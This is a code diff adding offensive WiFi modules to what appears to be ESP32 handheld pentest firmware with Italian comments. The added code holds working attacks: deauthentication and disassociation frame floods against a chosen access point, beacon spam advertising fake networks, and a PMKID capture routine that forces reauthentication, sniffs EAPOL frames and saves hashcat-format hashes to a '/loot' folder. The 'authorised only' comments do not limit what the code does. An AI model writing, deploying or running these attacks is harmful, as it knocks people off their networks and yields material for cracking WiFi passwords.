@@ -25,6 +25,7 @@
 #include <BLEScan.h>
 #include <BLEAdvertisedDevice.h>
 #include <SPI.h>
+#include <esp_wifi.h>
 #include <RF24.h>
 #include <IRrecv.h>
 #include <IRremoteESP8266.h>
@@ -941,6 +942,277 @@ void badusbRun() {
   footerBar("OK di nuovo  NEXT scegli  PREV menu");
 }
 
+// ============================================================================
+// Modulo REALE: Attacco WiFi (deauth mirato + beacon spam) — SOLO AUTORIZZATO
+//   Iniezione 802.11 raw via esp_wifi_80211_tx. Efficacia da validare su HW.
+// ============================================================================
+struct ApT { uint8_t bssid[6]; uint8_t ch; char ssid[24]; };
+static ApT apCache[24];
+static int apCacheN = 0;
+static int atkSel = 0;
+
+static void scanApCache() {
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  int n = WiFi.scanNetworks(false, true);
+  apCacheN = 0;
+  for (int i = 0; i < n && apCacheN < 24; i++) {
+    memcpy(apCache[apCacheN].bssid, WiFi.BSSID(i), 6);
+    apCache[apCacheN].ch = WiFi.channel(i);
+    String s = WiFi.SSID(i);
+    if (s.length() == 0) s = "<nascosta>";
+    s.toCharArray(apCache[apCacheN].ssid, 24);
+    apCacheN++;
+  }
+  WiFi.scanDelete();
+}
+
+static const uint8_t DEAUTH_TMPL[26] = {
+  0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x00, 0x00, 0x07, 0x00
+};
+static uint32_t deauthBurst(const uint8_t *bssid, uint8_t ch) {
+  uint8_t f[26];
+  memcpy(f, DEAUTH_TMPL, 26);
+  memcpy(f + 10, bssid, 6);   // src = AP
+  memcpy(f + 16, bssid, 6);   // bssid = AP
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+  uint32_t cnt = 0;
+  uint32_t t0 = millis();
+  while (millis() - t0 < 4000) {
+    f[0] = 0xc0; esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);  // deauth
+    f[0] = 0xa0; esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);  // disassoc
+    cnt += 2;
+    delay(1);
+  }
+  return cnt;
+}
+
+static uint32_t beaconSpam() {
+  static const char *names[] = { "NexusSec_Test", "Free_WiFi", "Pentest_Lab", "Lab_2G", "GuestNet" };
+  uint8_t pkt[128];
+  const uint8_t head[] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
+  const uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c };
+  uint32_t cnt = 0;
+  uint32_t t0 = millis();
+  while (millis() - t0 < 4000) {
+    for (int k = 0; k < 5; k++) {
+      int p = 0;
+      memcpy(pkt, head, 10); p = 10;
+      uint8_t mac[6] = { 0x02, 0x11, 0x22, (uint8_t)k, (uint8_t)random(255), (uint8_t)random(255) };
+      memcpy(pkt + p, mac, 6); p += 6;   // src
+      memcpy(pkt + p, mac, 6); p += 6;   // bssid
+      pkt[p++] = 0x00; pkt[p++] = 0x00;  // seq
+      for (int i = 0; i < 8; i++) pkt[p++] = 0;             // timestamp
+      pkt[p++] = 0x64; pkt[p++] = 0x00;                     // interval
+      pkt[p++] = 0x01; pkt[p++] = 0x04;                     // capability
+      const char *nm = names[k];
+      int nl = strlen(nm);
+      pkt[p++] = 0x00; pkt[p++] = nl;                       // SSID IE
+      memcpy(pkt + p, nm, nl); p += nl;
+      memcpy(pkt + p, rates, sizeof(rates)); p += sizeof(rates);
+      pkt[p++] = 0x03; pkt[p++] = 0x01; pkt[p++] = 1;       // DS param (ch 1)
+      esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+      esp_wifi_80211_tx(WIFI_IF_STA, pkt, p, false);
+      cnt++;
+    }
+    delay(2);
+  }
+  return cnt;
+}
+
+void moduleWifiAttack() {
+  tft.fillScreen(C_BG);
+  statusBar("ATTACCO WIFI");
+  if (apCacheN == 0) {
+    tft.setTextDatum(MC_DATUM); tft.setTextFont(2); tft.setTextColor(C_CY, C_BG);
+    tft.drawString("Scansione target...", W / 2, H / 2);
+    scanApCache();
+    tft.fillScreen(C_BG); statusBar("ATTACCO WIFI");
+  }
+  tft.setTextDatum(ML_DATUM); tft.setTextFont(1);
+  tft.setTextColor(C_CRIT, C_BG);
+  tft.drawString("! MODALITA' OFFENSIVA - solo autorizzato", 6, SBAR + 10);
+
+  int y = SBAR + 26, rowH = 18, maxRows = (H - FBAR - y) / rowH;
+  int total = apCacheN + 1;                    // indice 0 = beacon spam
+  if (atkSel >= total) atkSel = 0;
+  int start = 0;
+  if (atkSel >= maxRows) start = atkSel - maxRows + 1;
+  for (int i = start; i < total && (i - start) < maxRows; i++) {
+    bool sel = (i == atkSel);
+    tft.setTextFont(2);
+    tft.setTextColor(sel ? C_CY : C_TXT, C_BG);
+    String label;
+    if (i == 0) label = "\xBB Beacon spam (reti fake)";
+    else { char b[40]; snprintf(b, sizeof(b), "c%d %s", apCache[i - 1].ch, apCache[i - 1].ssid); label = b; }
+    if (label.length() > 26) label = label.substring(0, 25) + "~";
+    tft.drawString((sel ? "> " : "  ") + label, 6, y + rowH / 2);
+    y += rowH;
+  }
+  footerBar("OK esegui  NEXT scegli  PREV menu");
+}
+
+void wifiAttackRun() {
+  tft.fillScreen(C_BG);
+  statusBar("ATTACCO WIFI");
+  tft.setTextDatum(MC_DATUM); tft.setTextFont(4);
+  tft.setTextColor(C_CRIT, C_BG);
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  uint32_t n;
+  if (atkSel == 0) {
+    tft.drawString("Beacon spam...", W / 2, H / 2);
+    n = beaconSpam();
+    tft.setTextColor(C_OK, C_BG); tft.setTextFont(2);
+    char b[28]; snprintf(b, sizeof(b), "%lu beacon inviati", (unsigned long)n);
+    tft.drawString(b, W / 2, H / 2 + 30);
+  } else {
+    ApT &t = apCache[atkSel - 1];
+    tft.drawString("Deauth...", W / 2, H / 2 - 10);
+    tft.setTextFont(2); tft.setTextColor(C_MUT, C_BG);
+    tft.drawString(t.ssid, W / 2, H / 2 + 16);
+    n = deauthBurst(t.bssid, t.ch);
+    tft.setTextColor(C_OK, C_BG);
+    char b[28]; snprintf(b, sizeof(b), "%lu frame inviati", (unsigned long)n);
+    tft.drawString(b, W / 2, H / 2 + 40);
+  }
+  footerBar("OK di nuovo  NEXT scegli  PREV menu");
+}
+
+// ============================================================================
+// Modulo REALE: Handshake / PMKID (sniffer promiscuo EAPOL + deauth) — AUTORIZZATO
+//   Estrae il PMKID dal messaggio M1 e lo salva in formato hashcat 22000.
+//   Implementazione beta: da validare su hardware.
+// ============================================================================
+static volatile int hsEapol = 0;
+static volatile bool hsPmkid = false;
+static char hsLine[160];
+static uint8_t hsBssid[6];
+static char hsSsid[24];
+static int hsSel = 0;
+
+static void hsCb(void *buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_DATA) return;
+  wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
+  uint8_t *d = p->payload;
+  int len = p->rx_ctrl.sig_len;
+  if (len < 40) return;
+  uint8_t fc0 = d[0];
+  if (((fc0 >> 2) & 3) != 2) return;            // solo frame DATA
+  int hdr = 24;
+  if ((fc0 >> 4) & 0x08) hdr += 2;              // QoS
+  if (len < hdr + 8 + 4) return;
+  if (!(d[hdr + 6] == 0x88 && d[hdr + 7] == 0x8e)) return;  // EAPOL
+  uint8_t *eap = d + hdr + 8;
+  if (eap[1] != 0x03) return;                   // EAPOL-Key
+  hsEapol++;
+  uint8_t *a1 = d + 4, *a2 = d + 10, *a3 = d + 16;
+  if (memcmp(a3, (const void *)hsBssid, 6) != 0) return;
+  int avail = len - (hdr + 8);
+  for (int i = 0; i + 20 <= avail; i++) {
+    if (eap[i] == 0x00 && eap[i + 1] == 0x0f && eap[i + 2] == 0xac && eap[i + 3] == 0x04) {
+      if (hsPmkid) return;
+      uint8_t *pk = eap + i + 4;                 // 16 byte PMKID (M1: src=AP)
+      char *o = hsLine;
+      o += sprintf(o, "WPA*01*");
+      for (int b = 0; b < 16; b++) o += sprintf(o, "%02x", pk[b]);
+      o += sprintf(o, "*");
+      for (int b = 0; b < 6; b++) o += sprintf(o, "%02x", a2[b]);   // AP
+      o += sprintf(o, "*");
+      for (int b = 0; b < 6; b++) o += sprintf(o, "%02x", a1[b]);   // STA
+      o += sprintf(o, "*");
+      for (unsigned b = 0; b < strlen((const char *)hsSsid); b++) o += sprintf(o, "%02x", (uint8_t)hsSsid[b]);
+      o += sprintf(o, "***");
+      hsPmkid = true;
+      return;
+    }
+  }
+}
+
+void moduleHandshake() {
+  tft.fillScreen(C_BG);
+  statusBar("HANDSHAKE / PMKID");
+  if (apCacheN == 0) {
+    tft.setTextDatum(MC_DATUM); tft.setTextFont(2); tft.setTextColor(C_CY, C_BG);
+    tft.drawString("Scansione target...", W / 2, H / 2);
+    scanApCache();
+    tft.fillScreen(C_BG); statusBar("HANDSHAKE / PMKID");
+  }
+  tft.setTextDatum(ML_DATUM); tft.setTextFont(1); tft.setTextColor(C_MUT, C_BG);
+  tft.drawString("Scegli l'AP target", 6, SBAR + 10);
+  int y = SBAR + 26, rowH = 18, maxRows = (H - FBAR - y) / rowH;
+  if (hsSel >= apCacheN) hsSel = 0;
+  int start = (hsSel >= maxRows) ? hsSel - maxRows + 1 : 0;
+  for (int i = start; i < apCacheN && (i - start) < maxRows; i++) {
+    bool sel = (i == hsSel);
+    tft.setTextFont(2); tft.setTextColor(sel ? C_CY : C_TXT, C_BG);
+    char b[40]; snprintf(b, sizeof(b), "c%d %s", apCache[i].ch, apCache[i].ssid);
+    String label = b; if (label.length() > 26) label = label.substring(0, 25) + "~";
+    tft.drawString((sel ? "> " : "  ") + label, 6, y + rowH / 2);
+    y += rowH;
+  }
+  footerBar("OK cattura  NEXT scegli  PREV menu");
+}
+
+void handshakeRun() {
+  ApT &t = apCache[hsSel];
+  memcpy((void *)hsBssid, t.bssid, 6);
+  strncpy(hsSsid, t.ssid, sizeof(hsSsid));
+  hsEapol = 0; hsPmkid = false;
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  esp_wifi_set_channel(t.ch, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&hsCb);
+
+  uint8_t f[26];
+  memcpy(f, DEAUTH_TMPL, 26);
+  memcpy(f + 10, t.bssid, 6);
+  memcpy(f + 16, t.bssid, 6);
+
+  uint32_t t0 = millis(), lastD = 0;
+  while (millis() - t0 < 15000 && !hsPmkid) {
+    if (millis() - lastD > 2000) {              // deauth periodico per forzare M1
+      lastD = millis();
+      for (int i = 0; i < 16; i++) { esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false); delay(1); }
+    }
+    tft.fillRect(0, SBAR, W, H - SBAR - FBAR, C_BG);
+    statusBar("HANDSHAKE / PMKID");
+    tft.setTextDatum(MC_DATUM); tft.setTextFont(2); tft.setTextColor(C_MUT, C_BG);
+    tft.drawString(t.ssid, W / 2, SBAR + 24);
+    tft.setTextFont(4); tft.setTextColor(C_CY, C_BG);
+    char b[16]; snprintf(b, sizeof(b), "%d", hsEapol);
+    tft.drawString(b, W / 2, SBAR + 64);
+    tft.setTextFont(2); tft.setTextColor(C_MUT, C_BG);
+    tft.drawString("frame EAPOL", W / 2, SBAR + 92);
+    tft.setTextColor(hsPmkid ? C_OK : C_WARN, C_BG);
+    tft.drawString(hsPmkid ? "PMKID acquisito!" : "in ascolto...", W / 2, SBAR + 122);
+    delay(250);
+  }
+
+  esp_wifi_set_promiscuous(false);
+
+  bool saved = false;
+  if (hsPmkid && sdInit()) {
+    SD.mkdir("/loot");
+    File f2 = SD.open("/loot/pmkid.22000", FILE_APPEND);
+    if (f2) { f2.println(hsLine); f2.close(); saved = true; }
+  }
+
+  tft.fillScreen(C_BG);
+  statusBar("HANDSHAKE / PMKID");
+  tft.setTextDatum(MC_DATUM); tft.setTextFont(4);
+  tft.setTextColor(hsPmkid ? C_OK : C_MUT, C_BG);
+  tft.drawString(hsPmkid ? "PMKID!" : "Nessun PMKID", W / 2, H / 2 - 10);
+  tft.setTextFont(1); tft.setTextColor(C_MUT, C_BG);
+  tft.drawString(saved ? "salvato: /loot/pmkid.22000" :
+                 (hsPmkid ? "microSD assente: non salvato" : "riprova avvicinandoti all'AP"),
+                 W / 2, H / 2 + 24);
+  footerBar("OK di nuovo  NEXT scegli  PREV menu");
+}
+
 // Schermata segnaposto per i moduli non ancora implementati
 void modulePlaceholder(int id) {
   tft.fillScreen(C_BG);
@@ -976,6 +1248,8 @@ void openModule(int id) {
   curProfile = id;
   state = ST_MODULE;
   if (id == P_RECON)       { wardrivingMode = false; moduleWifiScan(); }
+  else if (id == P_ATTACK)   { atkSel = 0; apCacheN = 0; moduleWifiAttack(); }
+  else if (id == P_HANDSHAKE) { hsSel = 0; apCacheN = 0; moduleHandshake(); }
   else if (id == P_BLE)      moduleBleScan();
   else if (id == P_NRF24)    moduleNrf24Scan();
   else if (id == P_SUBGHZ)   moduleSubghz();
@@ -1039,8 +1313,12 @@ void loop() {
       if (p) { state = ST_HOME; drawHome(); }        // indietro
       else if (n && curProfile == P_RECON) { wardrivingMode = true; moduleWardriving(); }
       else if (n && curProfile == P_BADUSB) { badusbSel++; moduleBadusb(); }
+      else if (n && curProfile == P_ATTACK) { atkSel++; moduleWifiAttack(); }
+      else if (n && curProfile == P_HANDSHAKE) { hsSel++; moduleHandshake(); }
       else if (o) {                                   // azione del modulo
         if (curProfile == P_RECON) { if (wardrivingMode) moduleWardriving(); else moduleWifiScan(); }
+        else if (curProfile == P_ATTACK) wifiAttackRun();
+        else if (curProfile == P_HANDSHAKE) handshakeRun();
         else if (curProfile == P_BLE) moduleBleScan();
         else if (curProfile == P_NRF24) moduleNrf24Scan();
         else if (curProfile == P_SUBGHZ) moduleSubghz();
